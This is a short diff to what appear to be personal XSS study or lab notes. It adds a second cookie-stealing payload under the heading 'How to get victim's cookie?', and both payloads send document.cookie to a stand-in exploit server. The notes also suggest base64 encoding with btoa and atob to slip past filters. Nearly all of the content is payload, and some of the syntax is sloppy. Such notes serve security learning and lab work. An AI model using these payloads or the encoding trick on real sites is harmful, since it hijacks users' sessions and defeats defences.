@@ -59,6 +59,7 @@ https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/
 
 How to get victim's cookie?
 1. fetch('exploit_server/?document.cookie()')
+2. location='https://lab/?query=(document.location="https://exploitserver/?document.cookie")
 
 If it is blocked, you may need to encode with base64. You can first base64 with btoa(payload) in your browser's console. Then you can use atob(payload) as your final payload.
 
